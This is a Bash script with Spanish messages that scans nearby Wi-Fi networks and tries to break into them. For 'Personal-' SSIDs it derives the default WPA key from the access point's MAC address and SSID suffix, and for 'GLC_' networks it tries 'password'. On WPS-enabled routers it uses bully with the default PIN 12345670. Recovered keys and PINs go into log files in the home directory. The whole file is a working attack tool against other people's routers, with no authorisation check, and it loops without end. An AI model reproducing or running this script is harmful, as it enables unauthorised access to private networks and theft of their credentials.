#/bin/bash

# --- Colores para la salida ---
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[93m"
BLUE="\e[34m"
BOLD="\e[1m"
RESET="\e[0m"

INTERVALO=5
INTERFACE=$1
TOPSENIAL=-75
DELAY=10s

TMP="/tmp/redes.txt"

# Chequeo de dependencias
REQUIRED_CMDS=(iw iwlist wpa_passphrase wpa_supplicant timeout bully pkill awk sed grep ip)
declare -A PKG_MAP=(
  [iw]=iw
  [iwlist]=wireless-tools
  [wpa_passphrase]=wpa-supplicant
  [wpa_supplicant]=wpa-supplicant
  [timeout]=coreutils
  [bully]=bully
  [pkill]=procps
  [awk]=gawk
  [sed]=sed
  [grep]=grep
  [ip]=iproute2
)

missing=()
pkgs=()
for cmd in "${REQUIRED_CMDS[@]}"; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    missing+=("$cmd")
    pkg="${PKG_MAP[$cmd]:-$cmd}"
    # evitar duplicados en pkgs
    case " ${pkgs[*]} " in
      *" $pkg "*) ;;
      *) pkgs+=("$pkg") ;;
    esac
  fi
done

if [ "${#missing[@]}" -ne 0 ]; then
  echo -e "\n[ERROR] Faltan dependencias: ${missing[*]}"
  echo "Instálalas en Debian/Ubuntu con:"
  echo "  sudo apt-get update && sudo apt-get install -y ${pkgs[*]}"
  exit 1
fi

# Chequeo de dependencias


trap cleanup INT

uso() {
	echo -e "\n${YELLOW}Uso:${RESET} $0 <INTERFACE>"
	echo -e "\nEjemplo: $0 wlan0"
	exit 1
}




modomanager() {
	 ip link set "$INTERFACE" down 2>/dev/null
	 iw dev "$INTERFACE" set type managed
	 ip link set "$INTERFACE" up 2>/dev/null
}

modomonitor() {
	 ip link set "$INTERFACE" down 2>/dev/null
	 iw "$INTERFACE" set monitor control
	 ip link set "$INTERFACE" up 2>/dev/null
}

cleanup() {
	if [ ! -z "$SPINNER_PID" ]; then
		kill "$SPINNER_PID" 2>/dev/null
	fi

	exit 1
}

banner() {
	echo -e "${BLUE}${BOLD}"
	echo -e "============================================"
	echo -e "   Wifi User, Pass y WPS Default"
	echo -e "============================================"
	echo -e "${RESET}\n"
}

spinner() {

	local chars=("\\" "|" "/" "-")
	local delay=0.1
	local i=0

	while true; do
		local index=$((i % 4))
		local char=${chars[$index]}
		printf "\rProcesando... %s" "$char"
		i=$((i + 1))
		sleep $delay
	done
}

es_mac_valida() {
	local mac="$1"
	[[ "$mac" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]] && [[ "$mac" != "00:00:00:00:00:00" ]]
}

if [ $# -ne 1 ]; then
	uso
fi

# Verificar si el script se ejecuta con privilegios de root
if [ "$EUID" -ne 0 ]; then
	echo -e "\n${RED}[ERROR]${RESET} Este script debe ejecutarse con sudo o como root.${RESET}"
	exit 1
fi

# Determina la interfaz inalámbrica por defecto si no se pasa como parámetro
#if [ -z "$INTERFACE" ]; then
#	INTERFACE=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type/{mode=$2; if(mode=="managed"){print iface}}' | head -n1)
#fi

# Validar que se encontró una interfaz
if [ ! -z "$INTERFACE" ]; then
	modomanager
else
	echo -e "${RED}[ERROR]${RESET} La interfaz ${BOLD}$INTERFACE${RESET} no existe."
	uso
	exit 1
fi

function intentoConexionWPS() {
	MAC=$3
	INTERFACE=$6
	CHAN=$4
	ESSID=$1
	PIN=$2
	SENIAL=$5

	if es_mac_valida "$MAC"; then
		echo -e "\n\n${BLUE}${BOLD}📡 Probando${RESET}: ${BOLD}${MAC}${RESET} ${BLUE}(ESSID: ${BOLD}${ESSID}${RESET}${BLUE}, Canal: ${BOLD}${CHAN}${RESET}${BLUE}, Señal: -${BOLD}${SENIAL} dBm${RESET}${BLUE})${RESET}\n\n"
	fi

	timeout $DELAY bully -b "$MAC" -B -p "$PIN" -v3 "$INTERFACE" | tee -a "/tmp/bully_output.log" | {
		timeout_count=0

		while IFS= read -r line; do

			# Contador de timeouts
			if [[ "$line" == *"Tx(DeAuth) = 'Timeout'"* ]]; then
				((timeout_count++))
			fi

			if [[ "$line" == *"Rx("*"Assn"*") = 'Timeout'"* ]]; then
				((timeout_count++))
			fi

			# Errores fatales
			if [[ "$line" == *"WPS locked"* || "$line" == *"WPS transaction failed"* || "$line" == *"Too many failed attempts"* || "$line" == *"failed to associate"* ]]; then
				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}[FALLÓ]${RESET}\n"
				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
				pkill -f "bully.*$MAC"
				break
			fi

			# Éxito: clave encontrada
			if [[ "$line" == *"key"* || "$line" == *"KEY"* ]]; then
				KEY=$(echo "$line" | cut -d"'" -f4)
				echo -e "\n${GREEN}${BOLD}[✓] PIN correcto para ${RESET}${BOLD}${MAC}${RESET}${GREEN} - PIN: ${RESET}${BOLD}${PIN}${RESET}${GREEN} - KEY: ${RESET}${BOLD}${KEY}${RESET}"
				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${KEY}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MAC}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
				echo "[$(date '+%F %T')] OK  | ${MAC} | ${ESSID} | ${PIN}| ${KEY}" >>"$HOME/wifiwps-password-default.txt"
				pkill -f "bully.*$MAC"
				break
			fi

			# Demasiados timeouts
			if [[ $timeout_count -ge 3 ]]; then

				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
				pkill -f "bully.*$MAC"
				break
			fi

		done

	}

	if [ ! "$(grep -i "$MAC" $HOME/wifiwps-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MAC" $HOME/wifiwps-password-default.txt 2>/dev/null)" ]; then

		echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
		echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"

	fi

	modomanager

}

function IntentoConexion() {
	ssid="$1"
	clave="$2"
	macaddress="$3"
	interface="$4"

	modomanager

	rm -f /tmp/wpa_supplicant.conf /tmp/wpa_respuesta.log 2>/dev/null

	# Generar configuración wpa_supplicant (silenciado en pantalla)
	wpa_passphrase "$ssid" "$clave" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1

	# Ejecutar wpa_supplicant con timeout y guardar salida en log temporal
	timeout $DELAY wpa_supplicant -i "$interface" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true

	# Comprobar resultado
	if grep -qi "CTRL-EVENT-CONNECTED" /tmp/wpa_respuesta.log; then
		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${ssid}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${clave}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${macaddress}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
		echo "[$(date '+%F %T')] OK  | ${macaddress} | ${ssid} | ${clave}" >>"$HOME/wifi-password-default.txt"

	else
		# Determinar razón más específica (si existe)
		if grep -qi "CTRL-EVENT-AUTH-REJECT" /tmp/wpa_respuesta.log; then
			reason_color="${RED}[ERROR] Contraseña incorrecta${RESET}"
			reason_plain="ERROR: Contraseña incorrecta"
		elif grep -qi "CTRL-EVENT-NETWORK-NOT-FOUND" /tmp/wpa_respuesta.log; then
			reason_color="${RED}[ERROR] Red no encontrada${RESET}"
			reason_plain="ERROR: Red no encontrada"
		else
			reason_color="${YELLOW}[?] Estado desconocido${RESET}"
			reason_plain="WARN: Estado desconocido"
		fi

		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${ssid}${RESET}${YELLOW} con la Clave: ${BOLD}${clave}${RESET}${YELLOW} y MACAddress: ${BOLD}${macaddress}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
		echo "[$(date '+%F %T')] FAIL | ${macaddress} | ${ssid} | ${clave} | ${reason_plain}" >>"$HOME/wifi-sin-password-por-defecto.txt"

	fi

}

function MostrarRed() {
	essid=$1
	clave=$2
	macaddress=$3
	canal=$4
	INTERFACE=$5
	WPS_FOUND=$6
	echo -e "\n"
	echo -e "${GREEN}[RESULTADO]${RESET} Red $([[ $WPS_FOUND -eq 1 ]] && echo 'WPS' || echo 'WPAx') encontrada:"
	echo -e "   SSID     : ${BOLD}$essid${RESET}"
	echo -e "   MacAddress : ${BOLD}$macaddress${RESET}"
	echo -e "   Canal : ${BOLD}$canal${RESET}"
	echo -e "   Password : ${BOLD}$clave${RESET}"
	echo -e "   INTERFACE  : ${BOLD}$INTERFACE${RESET}"

}

function borrarTemporales() {
	 rm /tmp/redes.txt 2>/dev/null
	 rm /tmp/bully_output.log 2>/dev/null
	 rm /tmp/wpa_respuesta.log 2>/dev/null
	 rm /tmp/wpa_supplicant.conf 2>/dev/null
}

function bloqueCompleto() {
	local blk="$1"

	# Requisitos mínimos: Address, ESSID, Channel/Frequency
	if ! echo "$blk" | grep -qi 'address:'; then
		return 1
	fi
	if ! echo "$blk" | grep -qi 'essid:'; then
		return 1
	fi
	if ! (echo "$blk" | grep -qi 'channel:' || echo "$blk" | grep -qi 'frequency:'); then
		return 1
	fi

	if ! echo "$blk" | egrep -qi 'ie:|unknown:|encryption key:'; then
		return 1
	fi

	return 0
}

banner
echo -e "\n${GREEN}[OK]${RESET} Interfaz detectada: ${BOLD}$INTERFACE${RESET}"

# --- Escaneo de redes WiFi ---
echo -e "\n${BLUE}[INFO]${RESET} Iniciando escaneo de redes en ${BOLD}$INTERFAZ${RESET}..."

borrarTemporales

while true; do
	spinner &
	SPINNER_PID=$!

	iwlist "$INTERFACE" scan 2>/dev/null >"$TMP"

	awk '/Cell /{print ""; print $0; next} {print}' "$TMP" |

		# Leer bloque por bloque
		while IFS= read -r line; do
			if [[ -z "$line" ]]; then
				if [[ -n "$bloque" ]]; then
					if bloqueCompleto "$bloque"; then
						essid=""
						macaddress=""
						senial=""
						mac=""
						canal=""
						subssid=""
						clave=""
						echo "$bloque" | while read line; do

							essid=$(echo "$bloque" | sed -n 's/.*ESSID:"\(.*\)".*/\1/ip' | head -n1)

							enc=$(echo "$bloque" | grep -i 'encryption key:' | head -n1 || true)

							# Detectar la línea con la dirección MAC
							if [[ "$line" =~ Cell\ [0-9]+\ -\ Address:\ ([A-Fa-f0-9:]{17}) ]]; then
								macaddress="${BASH_REMATCH[1]}"
								mac=$(echo "$macaddress" | sed 's/://g' | awk '{print substr($0,3,7)}')
							fi

							# Detectar la línea del nivel de señal
							if [[ "$line" =~ Signal\ level=(-?[0-9]+) ]]; then
								senial="${BASH_REMATCH[1]}"

							fi
							if [[ "$line" =~ Channel: ]]; then
								canal=$(echo "$line" | sed -n 's/.*Channel:\(.*\)/\1/p' | xargs)
							fi
							if [ -n "$senial" ] && [ "$senial" -ge "$TOPSENIAL" ]; then

								if [[ "$line" =~ ESSID:\"([Pp]ersonal-[^\"]+)\" ]]; then
									essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
									subssid=$(echo "$essid" | grep -Po 'Personal(?:-WiFi)?-\K[A-Za-z0-9]{3}(?![a-zA-Z0-9])')
									clave=$(echo "$mac$subssid")

									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"

										IntentoConexion "$essid" "$clave" "$macaddress" "$INTERFACE"

									fi

								fi
								if [[ "$line" =~ ESSID:\"(GLC_.*)\" ]]; then
									essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}')
									clave=$"password"

									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"

										IntentoConexion "$essid" "$clave" $macaddress "$INTERFACE"

									fi

								fi
								line_lc=$(echo "$line" | tr '[:upper:]' '[:lower:]')

								enc_lc=$(echo "$enc" | tr '[:upper:]' '[:lower:]')

								if echo "$line_lc" | grep -qiE 'wps|0050f2|00:50:f2'; then
									if [[ -n "$enc_lc" && "$enc_lc" != *off* ]]; then
										WPS_FOUND=1
										PIN="12345670"

										if ! grep -iqF "$macaddress" "$HOME/wifiwps-sin-password-por-defecto.txt" 2>/dev/null &&
											! grep -iqF "$macaddress" "$HOME/wifiwps-password-default.txt" 2>/dev/null; then

											MostrarRed "$essid" "$PIN" "$macaddress" "$canal" "$INTERFACE" "$WPS_FOUND"
											modomonitor
											intentoConexionWPS "$essid" "$PIN" "$macaddress" "$canal" "$senial" "$INTERFACE"
											WPS_FOUND=0
										fi
									fi
								fi
							fi

						done
					fi
					bloque=""
				fi
			else
				# acumular línea en el bloque actual
				bloque+="$line"$'\n'
			fi
		done < <(cat)

	sleep 1

done
